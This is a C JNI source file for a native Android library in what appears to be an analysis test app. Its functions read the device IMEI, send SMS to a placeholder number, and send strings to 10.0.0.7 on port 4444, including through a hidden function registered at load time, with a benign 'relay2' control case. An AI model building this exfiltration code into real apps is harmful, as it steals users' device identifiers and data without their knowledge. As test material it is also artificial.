// libt7.so cho app test t7 — build bằng build.sh (zig cc, aarch64, -O2, strip)
#include <jni.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

static int conn(void) {
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a; memset(&a, 0, sizeof a);
    a.sin_family = AF_INET; a.sin_port = htons(4444); a.sin_addr.s_addr = inet_addr("10.0.0.7");
    connect(s, (struct sockaddr*)&a, sizeof a);
    return s;
}

JNIEXPORT void JNICALL Java_com_rdict_t7_MainActivity_up(JNIEnv* env, jclass c, jstring tag, jstring d) {
    const char* p = (*env)->GetStringUTFChars(env, d, 0);
    int s = conn();
    send(s, p, strlen(p), 0);
    close(s);
    (*env)->ReleaseStringUTFChars(env, d, p);
}

JNIEXPORT jboolean JNICALL Java_com_rdict_t7_MainActivity_sms(JNIEnv* env, jobject self, jstring tag, jstring msg) {
    jclass k = (*env)->FindClass(env, "android/telephony/SmsManager");
    jmethodID gd = (*env)->GetStaticMethodID(env, k, "getDefault", "()Landroid/telephony/SmsManager;");
    jobject sm = (*env)->CallStaticObjectMethod(env, k, gd);
    jmethodID st = (*env)->GetMethodID(env, k, "sendTextMessage",
        "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V");
    (*env)->CallVoidMethod(env, sm, st, (*env)->NewStringUTF(env, "+84900000000"), NULL, msg, NULL, NULL);
    return JNI_TRUE;
}

static jstring read_imei(JNIEnv* env, jobject ctx) {
    jclass cc = (*env)->FindClass(env, "android/content/Context");
    jmethodID gs = (*env)->GetMethodID(env, cc, "getSystemService", "(Ljava/lang/String;)Ljava/lang/Object;");
    jobject tm = (*env)->CallObjectMethod(env, ctx, gs, (*env)->NewStringUTF(env, "phone"));
    jclass tk = (*env)->FindClass(env, "android/telephony/TelephonyManager");
    jmethodID gi = (*env)->GetMethodID(env, tk, "getDeviceId", "()Ljava/lang/String;");
    return (jstring)(*env)->CallObjectMethod(env, tm, gi);
}

JNIEXPORT jstring JNICALL Java_com_rdict_t7_MainActivity_imei(JNIEnv* env, jobject self, jobject ctx) {
    return read_imei(env, ctx);
}

JNIEXPORT jboolean JNICALL Java_com_rdict_t7_MainActivity_check(JNIEnv* env, jclass c, jstring tag, jstring s) {
    const char* p = (*env)->GetStringUTFChars(env, s, 0);
    jboolean r = strcmp(p, "000000000000000") == 0;
    (*env)->ReleaseStringUTFChars(env, s, p);
    return r;
}

JNIEXPORT void JNICALL Java_com_rdict_t7_MainActivity_relay(JNIEnv* env, jobject self, jstring tag) {
    jstring id = read_imei(env, self);
    jclass me = (*env)->GetObjectClass(env, self);
    jmethodID cb = (*env)->GetMethodID(env, me, "onData", "(Ljava/lang/String;)V");
    (*env)->CallVoidMethod(env, self, cb, id);
}

JNIEXPORT void JNICALL Java_com_rdict_t7_MainActivity_relay2(JNIEnv* env, jobject self, jstring tag) {
    jclass me = (*env)->GetObjectClass(env, self);
    jmethodID cb = (*env)->GetMethodID(env, me, "onSafe", "(Ljava/lang/String;)V");
    (*env)->CallVoidMethod(env, self, cb, (*env)->NewStringUTF(env, "hello"));
}

static void hidden_z(JNIEnv* env, jclass c, jstring tag, jstring d) {
    const char* p = (*env)->GetStringUTFChars(env, d, 0);
    int s = conn();
    sendto(s, p, strlen(p), 0, NULL, 0);
}

static const JNINativeMethod M[] = {
    {"z", "(Ljava/lang/String;Ljava/lang/String;)V", (void*)hidden_z},
};

JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* r) {
    JNIEnv* env;
    if ((*vm)->GetEnv(vm, (void**)&env, JNI_VERSION_1_6) != JNI_OK) return -1;
    jclass k = (*env)->FindClass(env, "com/rdict/t7/MainActivity");
    (*env)->RegisterNatives(env, k, M, 1);
    return JNI_VERSION_1_6;
}
